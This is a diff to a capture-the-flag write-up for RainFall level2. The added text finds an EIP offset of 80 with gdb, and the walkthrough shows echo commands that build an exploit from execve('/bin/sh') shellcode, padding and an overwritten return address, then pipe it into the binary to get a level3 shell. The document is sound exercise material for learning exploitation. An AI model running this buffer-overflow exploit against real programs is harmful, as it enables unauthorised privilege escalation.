@@ -43,6 +43,20 @@ level2@RainFall:~$ gdb -q level2
    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
 ...
 ```
+Using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the EIP offset is 80.
+```
+level2@RainFall:~$ gdb -q level2
+...
+(gdb) run
+Starting program: /home/user/level2/level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+```
+This menas we can write our malicious code in the stdin, followed by garbage until the buffer overflows and we reach 80 characters, where the return address can be overwritten.
+
 However, this buffer is stored on the stack, unfortunately function ```p``` checks to make sure the return address isn't in the stack.
 ```
 (gdb) disas p
@@ -96,15 +110,15 @@ Lets create our exploit file, starting with our malicious shellcode, adding back
 ```
 level2@RainFall:~$ echo -e -n "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" > /tmp/level2_exploit
 ```
-We then want to fill the rest of the buffer with garbage.
+We earlier found the EIP offset is 80, we overflow the gets() buffer with whatever garbage until we reach 80 characters total.
 ```
 level2@RainFall:~$ echo -e -n "------------------------------------------------------" >> /tmp/level2_exploit
 ```
-And overwrite the return address with the address of our malicious shellcode, now in the heap.
+Finally overwrite the return address with the address of our malicious shellcode, now in the heap.
 ```
 level2@RainFall:~$ echo -e -n "\x08\xa0\x04\x08" >> /tmp/level2_exploit
 ```
-Pipe the exploit into ./level2 stdin. This opens a shell as user ```level3```, where we can cat the level3 password.
+Pipe the exploit file into ./level2 stdin. This opens a shell as user ```level3```, where we can cat the level3 password.
 ```
 level2@RainFall:~$ cat /tmp/level2_exploit - | ./level2
 [press enter]
